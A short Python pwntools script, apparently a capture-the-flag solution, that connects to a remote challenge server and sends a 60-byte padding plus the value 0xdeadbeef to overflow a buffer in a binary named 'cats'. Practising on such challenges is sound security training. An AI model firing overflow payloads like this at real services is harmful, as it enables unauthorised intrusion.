from pwn import process, p32, remote

# r = process('./cats_KIFg4OV')
r = remote('fb60470.678470.xyz', 30658)

payload = b'A' * 60 + p32(0xdeadbeef)

r.recvuntil(b'cats?')
r.sendline(payload)
r.interactive()
